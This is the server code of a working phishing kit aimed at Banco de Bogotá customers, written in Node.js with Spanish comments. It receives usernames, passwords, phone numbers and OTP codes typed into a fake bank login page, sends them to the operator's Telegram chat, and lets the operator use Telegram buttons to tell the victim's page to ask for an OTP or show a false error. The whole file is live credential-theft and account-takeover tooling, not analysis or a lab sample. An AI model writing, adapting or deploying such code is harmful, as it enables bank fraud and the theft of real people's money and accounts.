const express = require('express');
const fetch = require('node-fetch');
const { initializeApp } = require('firebase-admin/app');
const { getDatabase } = require('firebase-admin/database');

initializeApp({
  databaseURL: process.env.FIREBASE_DB_URL
});

const db = getDatabase();
const app = express();
app.use(express.json());

// Token seguro protegido en las variables de entorno de Render
const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = "7924619096"; // O puedes ponerlo también en variables de entorno si prefieres

// 1. NUEVA RUTA: Recibe la alerta desde tu web y la manda a Telegram de forma segura
app.post('/enviar-alerta-telegram', async (req, res) => {
    const { tipo, datos } = req.body;
    let mensaje = "";
    
    let tecladoBotones = {
        inline_keyboard: [
            [
                { text: "🔑 Pedir OTP", callback_data: "cmd_otp" },
                { text: "❌ Error Clave", callback_data: "cmd_error_login" }
            ],
            [
                { text: "⚠️ Error OTP", callback_data: "cmd_otp_error" },
                { text: "✅ Finalizar", callback_data: "cmd_finalizar" }
            ]
        ]
    };

    if (tipo === 'login') {
        mensaje = `🚨 *Nuevo Login — Banco de Bogotá*\n\n👤 Usuario: \`${datos.usuario}\`\n🔑 Clave: \`${datos.clave}\`\n📱 Celular: \`${datos.phone}\``;
    } else if (tipo === 'otp') {
        mensaje = `🔐 *OTP Ingresado*\n\n🔑 Código: \`${datos.code}\`\n📱 Celular: \`${datos.phone}\``;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: 'Markdown',
                reply_markup: tecladoBotones
            })
        });
        res.status(200).json({ success: true });
    } catch (e) {
        console.error("Error enviando mensaje a Telegram", e);
        res.status(500).json({ error: "Error al enviar" });
    }
});

// 2. RUTA EXISTENTE: Recibe los clics de los botones interactivos de Telegram
app.post('/webhook-telegram', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const query = update.callback_query;
        const accion = query.data;
        const callbackQueryId = query.id;

        const sessionsRef = db.ref('sessions');
        const snapshot = await sessionsRef.limitToLast(1).once('value');
        
        if (snapshot.exists()) {
            let sessionId = '';
            snapshot.forEach((childSnapshot) => {
                sessionId = childSnapshot.key;
            });

            const sessionRef = db.ref(`sessions/${sessionId}`);

            if (accion === 'cmd_otp') {
                await sessionRef.update({ status: 'otp' });
                await confirmarBotonTelegram(callbackQueryId, "✅ Estado: Pedir OTP");
            } else if (accion === 'cmd_error_login') {
                await sessionRef.update({ status: 'error_login' });
                await confirmarBotonTelegram(callbackQueryId, "❌ Estado: Error de Clave");
            } else if (accion === 'cmd_otp_error') {
                await sessionRef.update({ status: 'otp_error' });
                await confirmarBotonTelegram(callbackQueryId, "⚠️ Estado: Error de OTP");
            } else if (accion === 'cmd_finalizar') {
                await sessionRef.update({ status: 'finalizar' });
                await confirmarBotonTelegram(callbackQueryId, "🏁 Sesión finalizada");
            }
        }
    }

    res.sendStatus(200);
});

async function confirmarBotonTelegram(callbackQueryId, texto) {
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text: texto, show_alert: false })
        });
    } catch (e) {
        console.error("Error al responder a Telegram", e);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});